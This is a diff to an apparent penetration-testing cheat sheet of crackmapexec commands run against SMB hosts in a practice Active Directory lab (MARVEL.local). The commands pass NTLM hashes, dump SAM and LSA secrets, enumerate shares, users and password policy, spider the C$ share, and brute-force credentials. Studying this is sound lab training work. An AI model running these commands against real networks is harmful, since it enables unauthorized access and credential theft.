@@ -80,10 +80,34 @@ crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH>
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --sam
+
+#enumerate shares
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --shares
+
+#enumerate local security authority
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --lsa
+
+#enumerate users
 crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --users
-crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --groups                                                                                           
+
+#enumerate groups
+crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --groups
+
+#enumerate file based on patterns
+crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --spider C\$ --pattern txt,log
+
+#enumerate password policy.
+crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --pass-pol
+ 
+#enumerate disks
+crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --disks
+
+#Bruteforce username. 
+crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@\$\$w0rd
+
+#Bruteforce password.
+crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@\$\$w0rd Password@123
+
 
 #Checkout module of particular protocol.
 crackmapexec smb -L
